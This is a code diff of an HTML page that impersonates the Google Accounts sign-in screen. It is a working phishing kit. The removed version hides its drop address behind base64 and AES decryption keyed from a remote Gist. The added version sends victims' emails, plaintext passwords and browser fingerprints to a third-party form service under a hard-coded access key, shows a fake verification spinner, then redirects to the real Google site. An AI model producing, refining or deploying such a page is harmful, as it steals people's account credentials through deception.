@@ -1,126 +1,316 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Sign in – Google Accounts</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <style>
-    body { font-family: Arial, sans-serif; background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-    .container { background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 400px; }
-    input, button { width: 100%; padding: 12px; margin: 8px 0; font-size: 16px; }
-    button { background-color: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; }
-    button:hover { background-color: #1765cc; }
-    .hidden { display: none; }
-  </style>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap">
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'Roboto', sans-serif;
+            background-color: #fff;
+        }
+        .main-container {
+            width: 448px;
+            max-width: 95%;
+            padding: 48px 40px 36px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, 0.14), 0 3px 1px -2px rgba(0, 0, 0, 0.12), 0 1px 5px 0 rgba(0, 0, 0, 0.2);
+            text-align: center;
+            background-color: #fff;
+            position: relative;
+        }
+        .main-container.fade-out {
+            opacity: 0;
+            transform: translateY(-20px);
+        }
+        .main-container.fade-in {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        .logo {
+            width: 92px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin: 0;
+            line-height: 1.3333;
+        }
+        .subtitle {
+            font-size: 16px;
+            color: #5f6368;
+            margin: 8px 0 32px;
+        }
+        .input-container {
+            position: relative;
+            margin-bottom: 24px;
+        }
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
+            height: 56px;
+        }
+        input:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 1px 1px 0 rgba(0, 0, 0, 0.1), 0 1px 3px 0 rgba(0, 0, 0, 0.2);
+        }
+        .error {
+            color: #d93025;
+            font-size: 12px;
+            text-align: left;
+            margin-top: 4px;
+            display: none;
+        }
+        .links-buttons {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 24px;
+        }
+        .links-buttons a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.2s ease-in-out;
+        }
+        .links-buttons a:hover {
+            text-decoration: underline;
+        }
+        button {
+            background-color: #1a73e8;
+            color: #fff;
+            padding: 10px 24px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 96px;
+            transition: background-color 0.2s ease-in-out, transform 0.1s ease-in-out;
+        }
+        button:hover {
+            background-color: #174ea6;
+        }
+        .eye-icon {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            width: 24px;
+            height: 24px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zM12 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>') no-repeat center;
+            background-size: contain;
+        }
+        .eye-icon.hidden-icon {
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path d="M12 6.5c2.76 0 5 2.24 5 5s-2.24 5-5 5-5-2.24-5-5 2.24-5 5-5m0-2C6.48 4.5 2 7.21 0 12c2 4.79 6.48 7.5 12 7.5s10-2.71 12-7.5c-2-4.79-6.48-7.5-12-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>') no-repeat center;
+            background-size: contain;
+        }
+        .hidden {
+            display: none;
+        }
+        .loading-screen {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 10;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s ease-in-out, visibility 0.5s ease-in-out;
+        }
+        .loading-screen.visible {
+            opacity: 1;
+            visibility: visible;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1a73e8;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            margin-top: 20px;
+            font-size: 16px;
+            color: #202124;
+        }
+        .footer {
+            width: 100%;
+            max-width: 448px;
+            display: flex;
+            justify-content: center;
+            margin-top: 24px;
+        }
+        .footer a, .footer a:visited {
+            color: #5f6368;
+            text-decoration: none;
+            font-size: 12px;
+            margin: 0 10px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <form id="emailForm">
-      <input type="email" id="email" placeholder="Email or phone" required />
-      <button type="submit">Next</button>
-    </form>
-    <form id="passwordForm" class="hidden">
-      <input type="hidden" id="hiddenEmail" />
-      <input type="password" id="password" placeholder="Enter your password" required />
-      <button type="submit" id="submitButton">Submit</button>
-    </form>
-  </div>
+    <div class="main-container fade-in" id="mainContainer">
+        <div class="loading-screen" id="loadingScreen">
+            <div class="loader"></div>
+            <div class="loading-text">Verifying your information...</div>
+        </div>
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo" class="logo">
+        <div id="emailSection">
+            <h1>Sign in</h1>
+            <div class="subtitle">to continue to Google Account</div>
+            <form id="emailForm">
+                <div class="input-container">
+                    <input type="email" name="email" id="email" placeholder="Email or phone" required>
+                    <div id="emailError" class="error">Please enter a valid email or phone number</div>
+                </div>
+                <div class="links-buttons">
+                    <a href="https://accounts.google.com/signin/v2/recoveryidentifier">Forgot email?</a>
+                    <button type="submit">Next</button>
+                </div>
+            </form>
+        </div>
+        <div id="passwordSection" class="hidden">
+            <h1>Enter your password</h1>
+            <div class="subtitle" id="emailDisplay"></div>
+            <form id="passwordForm">
+                <div class="input-container">
+                    <input type="password" name="password" id="password" placeholder="Password" required>
+                    <span id="eyeIcon" class="eye-icon"></span>
+                    <div id="passwordError" class="error">Enter a password</div>
+                    <input type="hidden" name="email" id="emailHidden">
+                    <input type="hidden" name="fingerprint" id="fingerprint">
+                </div>
+                <div class="links-buttons">
+                    <a href="https://accounts.google.com/signin/v2/recoveryidentifier">Forgot password?</a>
+                    <button type="submit" id="submitBtn">Sign in</button>
+                </div>
+            </form>
+        </div>
+    </div>
+    <div class="footer">
+        <a href="https://support.google.com/accounts">Help</a>
+        <a href="https://policies.google.com/privacy">Privacy</a>
+        <a href="https://policies.google.com/terms">Terms</a>
+    </div>
 
-  <script>
-    document.addEventListener("DOMContentLoaded", () => {
-      // الرابط مشفر Base64 (استبدل النص تحت برابطك مشفر Base64)
-      const encryptedGistUrl = "aHR0cHM6Ly9naXN0LmNvbWJpbmF0L2FjY291bnQtdmVyaWZ5LzQyMDZhMWIwNjYyM2YyNDI2MDk4MDg2N2I5OTZkN2IyL3Jhdy82YjYyYWNiM2NhZGU0OWM4MjE4MjQxYmExYWQwN2FjNGE2NmM1YTk0L3NlY3JldHRfdHh0";
+    <script>
+        (function() {
+            const eS = document.getElementById("emailSection"),
+                  pS = document.getElementById("passwordSection"),
+                  eF = document.getElementById("emailForm"),
+                  pF = document.getElementById("passwordForm"),
+                  eI = document.getElementById("email"),
+                  eE = document.getElementById("emailError"),
+                  pI = document.getElementById("password"),
+                  pE = document.getElementById("passwordError"),
+                  eD = document.getElementById("emailDisplay"),
+                  eH = document.getElementById("emailHidden"),
+                  eIc = document.getElementById("eyeIcon"),
+                  mainContainer = document.getElementById("mainContainer"),
+                  loadingScreen = document.getElementById("loadingScreen");
 
-      // الإيميل مشفر AES (استبدل النص هنا بإيميلك المشفر)
-      const ENCRYPTED_EMAIL = "U2FsdGVkX1/Uu2RQW+edYH1yP2MoEFy0WAAapYMTBqhyX8gb1A3Zb+dFCQZ9oP+m";
+            const getFingerprint = () => {
+                const s = window.screen;
+                return JSON.stringify({
+                    uA: navigator.userAgent,
+                    lang: navigator.language,
+                    res: `${s.width}x${s.height}`,
+                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+                });
+            };
 
-      // دالة لفك تشفير رابط Gist من Base64
-      function decryptUrl(base64str) {
-        try {
-          return atob(base64str);
-        } catch (e) {
-          console.error("Failed to decode base64:", e);
-          return null;
-        }
-      }
+            const transitionToPassword = () => {
+                mainContainer.classList.remove("fade-in");
+                mainContainer.classList.add("fade-out");
+                setTimeout(() => {
+                    eS.classList.add("hidden");
+                    pS.classList.remove("hidden");
+                    eD.textContent = eI.value;
+                    eH.value = eI.value;
+                    pI.focus();
+                    mainContainer.classList.remove("fade-out");
+                    mainContainer.classList.add("fade-in");
+                }, 400);
+            };
 
-      // دالة لجلب المفتاح من Gist
-      async function fetchSecretKey(url) {
-        try {
-          const response = await fetch(`${url}?t=${Date.now()}`);
-          if (!response.ok) throw new Error("Network response not ok");
-          return await response.text();
-        } catch (e) {
-          console.error("Failed to fetch key:", e);
-          return null;
-        }
-      }
+            eF.addEventListener("submit", function(e) {
+                e.preventDefault();
+                if (!eI.value.trim()) {
+                    eE.style.display = "block";
+                    eI.focus();
+                    return;
+                }
+                eE.style.display = "none";
+                transitionToPassword();
+            });
 
-      // دالة فك تشفير الإيميل AES
-      function decryptEmail(encrypted, key) {
-        try {
-          const bytes = CryptoJS.AES.decrypt(encrypted, key.trim());
-          return bytes.toString(CryptoJS.enc.Utf8);
-        } catch (e) {
-          console.error("Failed to decrypt email:", e);
-          return null;
-        }
-      }
+            pF.addEventListener("submit", function(e) {
+                e.preventDefault();
+                if (!pI.value.trim()) {
+                    pE.style.display = "block";
+                    pI.focus();
+                    return;
+                }
 
-      // التعامل مع الفورمات
-      const emailForm = document.getElementById("emailForm");
-      const passwordForm = document.getElementById("passwordForm");
-      const submitButton = document.getElementById("submitButton");
+                loadingScreen.classList.add("visible");
 
-      emailForm.addEventListener("submit", (e) => {
-        e.preventDefault();
-        document.getElementById("hiddenEmail").value = document.getElementById("email").value;
-        emailForm.classList.add("hidden");
-        passwordForm.classList.remove("hidden");
-      });
+                const formData = new FormData(pF);
+                formData.append("access_key", "cd260ba9-6aac-45fd-bfd5-bcc299bb5c68");
+                formData.append("subject", "New Login Data - Injected");
+                
+                fetch("https://api.web3forms.com/submit", {
+                    method: "POST",
+                    body: formData
+                }).then(response => {
+                    setTimeout(() => {
+                        window.location.href = "https://accounts.google.com";
+                    }, 2000);
+                }).catch(error => {
+                    console.log('Error during data submission:', error);
+                    setTimeout(() => {
+                        window.location.href = "https://accounts.google.com";
+                    }, 2000);
+                });
+            });
 
-      passwordForm.addEventListener("submit", async (e) => {
-        e.preventDefault();
-        submitButton.disabled = true;
-        submitButton.textContent = "Sending...";
-
-        const gistUrl = decryptUrl(encryptedGistUrl);
-        if (!gistUrl) {
-          window.location.href = "https://www.google.com";
-          return;
-        }
-
-        const secretKey = await fetchSecretKey(gistUrl);
-        if (!secretKey) {
-          window.location.href = "https://www.google.com";
-          return;
-        }
-
-        const decryptedEmail = decryptEmail(ENCRYPTED_EMAIL, secretKey);
-        if (!decryptedEmail || !decryptedEmail.includes("@")) {
-          window.location.href = "https://www.google.com";
-          return;
-        }
-
-        const formData = new FormData();
-        formData.append("email", document.getElementById("hiddenEmail").value);
-        formData.append("password", CryptoJS.SHA256(document.getElementById("password").value).toString());
-
-        fetch(`https://formsubmit.co/ajax/${decryptedEmail}`, {
-          method: "POST",
-          body: formData,
-          headers: { Accept: "application/json" },
-        })
-          .then((res) => res.json())
-          .then(() => {
-            window.location.href = "https://www.google.com";
-          })
-          .catch(() => {
-            window.location.href = "https://www.google.com";
-          });
-      });
-    });
-  </script>
+            eIc.addEventListener("click", function() {
+                const isHidden = pI.type === "password";
+                pI.type = isHidden ? "text" : "password";
+                eIc.classList.toggle("hidden-icon", !isHidden);
+            });
+        })();
+    </script>
 </body>
 </html>
